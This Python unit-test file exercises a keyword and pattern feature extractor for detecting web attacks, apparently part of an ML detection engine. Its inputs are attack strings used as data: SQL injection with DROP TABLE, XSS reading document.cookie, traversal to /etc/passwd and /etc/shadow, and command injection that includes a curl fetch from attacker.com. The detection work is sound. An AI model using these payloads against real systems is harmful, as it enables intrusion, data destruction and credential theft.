"""Unit tests for Task 3.2: Attack Keyword Frequency and Pattern Feature Extraction.

Validates keyword counting and syntax pattern matching across SQL Injection,
Cross-Site Scripting (XSS), Path Traversal, and OS Command Injection.

Academic References:
- [Ref 08] Torrano-Gimenez et al. (Wiley SCN 2015): "Combining Expert Knowledge with
  Automatic Feature Extraction for Reliable Web Attack Detection"
- [Ref 10] M. Hasan et al. (IEEE Access 2023): Systematic review of SQLi detection.
"""

import sys
import time
from pathlib import Path

# Ensure ml-engine is on sys.path
TEST_DIR = Path(__file__).resolve().parent
ML_ENGINE_DIR = TEST_DIR.parent
if str(ML_ENGINE_DIR) not in sys.path:
    sys.path.insert(0, str(ML_ENGINE_DIR))

from features.keywords import (  # noqa: E402
    AttackKeywordFeatures,
    count_cmd_injection_patterns,
    count_cmd_keywords,
    count_path_traversal_patterns,
    count_sql_keywords,
    count_sqli_patterns,
    count_xss_keywords,
    count_xss_patterns,
    extract_keyword_features,
    extract_keyword_features_batch,
)


class TestSQLKeywordExtraction:
    """Test suite for SQL Injection keyword frequency and regex patterns."""

    def test_sql_keywords_empty_or_none(self) -> None:
        assert count_sql_keywords("") == 0
        assert count_sql_keywords(None) == 0

    def test_sql_keywords_benign_string(self) -> None:
        assert count_sql_keywords("The quick brown fox jumps over the lazy dog") == 0
        assert count_sql_keywords("search query for science books") == 0

    def test_sql_keywords_word_boundaries(self) -> None:
        # "selection" or "unionized" should not trigger \bword\b
        assert count_sql_keywords("selection process and unionized workers") == 0

    def test_sql_keywords_case_insensitivity(self) -> None:
        payload = "uNiOn sElEcT username, password fRoM users wHeRe id=1"
        # union, select, from, where = 4
        assert count_sql_keywords(payload) == 4

    def test_sqli_syntax_patterns(self) -> None:
        assert count_sqli_patterns("' OR 1=1 --") >= 1
        assert count_sqli_patterns("admin'--") >= 1
        assert count_sqli_patterns("' UNION SELECT 1, 2, 3--") >= 1
        assert count_sqli_patterns("1' OR 'a'='a") >= 1
        assert count_sqli_patterns("id=1; DROP TABLE books_book;--") >= 1
        assert count_sqli_patterns("1' HAVING 1=1--") >= 1
        assert count_sqli_patterns("1' ORDER BY 5--") >= 1
        assert count_sqli_patterns("hello world normal user") == 0


class TestXSSKeywordExtraction:
    """Test suite for Cross-Site Scripting (XSS) keywords and regex patterns."""

    def test_xss_keywords_empty_or_none(self) -> None:
        assert count_xss_keywords("") == 0
        assert count_xss_keywords(None) == 0

    def test_xss_keywords_detection(self) -> None:
        payload = "<script>alert(document.cookie); prompt(1); eval('test');</script>"
        # script (x2), alert, document.cookie, prompt, eval = 6
        assert count_xss_keywords(payload) >= 5

    def test_xss_event_handlers(self) -> None:
        payload = "<img src=x onerror=alert(1) onload=prompt(1)>"
        # onerror, alert, onload, prompt = 4
        assert count_xss_keywords(payload) >= 4

    def test_xss_syntax_patterns(self) -> None:
        assert count_xss_patterns("<script>alert(1)</script>") >= 1
        assert count_xss_patterns("javascript:alert(1)") >= 1
        assert count_xss_patterns("<img src=x onerror=alert('XSS')>") >= 1
        assert count_xss_patterns("<svg onload=alert(1)>") >= 1
        assert count_xss_patterns("<iframe src='http://attacker.com'>") >= 1
        assert count_xss_patterns("Just a normal review text with no script.") == 0


class TestPathTraversalExtraction:
    """Test suite for Path Traversal / LFI patterns."""

    def test_path_traversal_empty_or_none(self) -> None:
        assert count_path_traversal_patterns("") == 0
        assert count_path_traversal_patterns(None) == 0

    def test_path_traversal_linux_and_windows(self) -> None:
        assert count_path_traversal_patterns("../../../../etc/passwd") >= 4
        assert count_path_traversal_patterns("..\\..\\windows\\system32\\cmd.exe") >= 2

    def test_path_traversal_encoded_variants(self) -> None:
        # %2e%2e/ and %252e%252e
        assert count_path_traversal_patterns("%2e%2e/%2e%2e/etc/shadow") >= 2
        assert count_path_traversal_patterns("%252e%252e%252fboot.ini") >= 1

    def test_path_traversal_benign_path(self) -> None:
        assert count_path_traversal_patterns("/api/v1/books/list") == 0


class TestCommandInjectionExtraction:
    """Test suite for OS Command Injection keywords and chaining patterns."""

    def test_cmd_keywords_and_syntax(self) -> None:
        assert count_cmd_keywords("whoami; cat /etc/passwd; netstat -an") >= 3
        assert count_cmd_injection_patterns("; whoami") >= 1
        assert count_cmd_injection_patterns("| cat /etc/passwd") >= 1
        assert count_cmd_injection_patterns("&& curl http://attacker.com/evil.sh") >= 1
        assert count_cmd_injection_patterns("; $(whoami)") >= 1
        assert count_cmd_injection_patterns("echo$IFS'hacked'") >= 1


class TestKeywordFeatureContainer:
    """Test suite for AttackKeywordFeatures dataclass and pipeline extraction."""

    def test_extract_keyword_features_types(self) -> None:
        payload = "' UNION SELECT password FROM users; <script>alert(1)</script>; whoami"
        features = extract_keyword_features(payload)

        assert isinstance(features, AttackKeywordFeatures)
        assert features.sql_keyword_count >= 2.0
        assert features.xss_keyword_count >= 2.0
        assert features.sqli_regex_matches >= 1.0
        assert features.xss_regex_matches >= 1.0
        assert features.cmd_keyword_count >= 1.0

        # Verify serialization
        d = features.to_dict()
        assert len(d) == 7
        assert "sql_keyword_count" in d

        canonical_5 = features.to_canonical_5_list()
        assert len(canonical_5) == 5
        assert all(isinstance(v, float) for v in canonical_5)

        full_7 = features.to_full_list()
        assert len(full_7) == 7

    def test_extract_keyword_features_none_and_non_string(self) -> None:
        feat_none = extract_keyword_features(None)
        assert feat_none.sql_keyword_count == 0.0
        assert feat_none.xss_keyword_count == 0.0

        feat_num = extract_keyword_features(9999)
        assert feat_num.sql_keyword_count == 0.0

    def test_batch_extraction_speed(self) -> None:
        samples = [
            "normal_search_term",
            "1' UNION SELECT username, password FROM auth_user--",
            "<script src='http://evil.com/xss.js'></script>",
            "../../../../etc/passwd",
            "; ping -c 3 127.0.0.1; whoami",
        ] * 200  # 1,000 samples

        start = time.perf_counter()
        results = extract_keyword_features_batch(samples)
        duration = time.perf_counter() - start

        assert len(results) == 1000
        # Sub-millisecond performance (< 80ms total for 1,000 samples)
        assert duration < 0.1, f"Batch extraction took {duration*1000:.2f}ms, expected < 100ms"
